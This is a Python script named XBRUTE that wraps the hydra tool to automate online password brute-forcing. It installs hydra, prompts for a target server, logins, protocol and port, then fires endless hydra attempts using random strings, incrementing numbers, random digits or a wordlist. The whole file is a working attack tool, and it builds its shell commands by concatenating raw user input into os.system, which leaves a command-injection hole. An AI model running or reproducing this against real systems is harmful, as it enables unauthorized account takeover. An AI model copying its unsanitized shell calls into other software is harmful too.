import string, random, time, os
print('Installing essential tools, be patient')
time.sleep(3)
os.system('apt install hydra toilet -y')
time.sleep(1)
os.system('toilet -f mono12 -F border XBRUTE')
print('''
Welcome to XBRUTE, small script made by IRISnoir to automate bruteforce process with Python3. Supports automatic brute with random characters and set of numbers.

* - Information that you MUST enter
''')

alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
numbers = '0123456789'

while True:
    server = input('*Specify the server which you want bruteforced: ')
    if server == '':
        print('Please enter a server to commence bruteforce.')
    else:
        print('')
        break

while True:
    login = input('*Specify the login or a file containing a list of logins which you want to bruteforce: ')
    if login != '':
        try:
            open(login)
        except FileNotFoundError:
            print('Data specified is not a filename.')
            time.sleep(3)
            login_spec = '-l'
            break
        else:
            print('Data specified is a filename.')
            time.sleep(3)
            login_spec = '-L'
        break
    else:
        print('You must enter the server name or file to continue.')

print('''
Supported protocols: adam6500 asterisk cisco cisco-enable cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
''')
while True:
    protocol = input('*Specify the protocol type: ')
    if protocol == '':
        print('You must specify a protocol.')
    else:
        print('Protocol given.')
        print('')
        break

while True:
    port = input('Select the port, leave blank and hydra will select default: ')
    if port == '':
        print('Port number not given. Hydra will select default.')
        print('')
        time.sleep(3)
        break
    else:
        try:
            int(port) / 1
        except ValueError:
            print('The port must be an integer.')
        else:
            print('Port given.')
            print('')
            port = '-s ' + str(port) + ' '
            time.sleep(1)
            break

extra = input('Input the extra statement (example: for https-post-form): ')
if extra == '':
    print('No supplied statement.')
else:
    print('Statement supplied.')

print('')
time.sleep(1)
save_conf = input('Do you wish to save cracked password pairs into a file? [y/n](Default: n): ')
if save_conf in ['y' , 'yes']:
    success_file = input('Specify the name of the file that will have your success written in (Leave blank if you change your mind): ')
    if success_file == '':
        print('You changed your mind, successful cracks will not be written to a file.')
        time.sleep(4)
    else:
        success_file = '-o ' + success_file + ' '
else:
    print('Successful cracks will not be written to a file.')
    success_file = ''

print('''
Method:
[1] - Random characters - Random customizable length
[2] - Integer bruteforce - Non-random
[3] - Integer bruteforce - Random
[4] - Specify file
''')
while True:
    method = input('*Select your bruteforcing method: ')
    if method == '1':
        while True:
            method_1_min_len = input('Input minimum length (Leave blank and the minimum length will be considered as \'1\'.): ')
            if method_1_min_len == '':
                print('The minimum length is set to \'1\'.')
                method_1_min_len = 1
                break
            else:
                try:
                    int(method_1_min_len) / 1
                except ValueError:
                    print('An integer is required.')
                else:
                    break
        while True:
            method_1_max_len = input('*Input maximum length: ')
            if method_1_max_len == '':
                print('You must supply a maximum length.')
            else:
                try:
                    int(method_1_max_len) / 1
                except ValueError:
                    print('An integer is required.')
                else:
                    break
        while True:
            password = ''.join(random.SystemRandom().choice(alphabet) for c in range(random.randint(int(method_1_min_len),int(method_1_max_len))))
            os.system('hydra ' + login_spec + ' ' + login + ' -p ' + password + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
    if method == '2':
        password = 0
        while True:
            os.system('hydra ' + login_spec + ' ' + login + ' -p ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
            password += 1
    if method == '3':
        while True:
            method_3_min_len = input('Input minimum length (Leave blank and the minimum length will be considered as \'1\'.): ')
            if method_3_min_len == '':
                print('The minimum length is set to \'1\'.')
                method_3_min_len = 1
                break
            else:
                try:
                    int(method_3_min_len) / 1
                except ValueError:
                    print('An integer is required.')
                else:
                    break
        while True:
            method_3_max_len = input('*Input maximum length: ')
            if method_3_max_len == '':
                print('You must supply a maximum length.')
            else:
                try:
                    int(method_3_max_len) / 1
                except ValueError:
                    print('An integer is required.')
                else:
                    break
        while True:
            password = ''.join(random.SystemRandom().choice(numbers) for c in range(random.randint(int(method_3_min_len),int(method_3_max_len))))
            os.system('hydra ' + login_spec + ' ' + login + ' -p ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
    if method == '4':
        while True:
            password = input('*Specify your wordlist: ')
            if password == '':
                print('You have to input a wordlist.')
            else:
                try:
                    open(password)
                except FileNotFoundError:
                    print('The file you specified doesn\'t exist.')
                else:
                    break
        os.system('hydra ' + login_spec + ' ' + login + ' -P ' + str(password) + ' -e nsr -u -v -V ' + port + success_file + protocol + '://' + server + extra)
        break
    else:
        print('Please select a number from the list.')
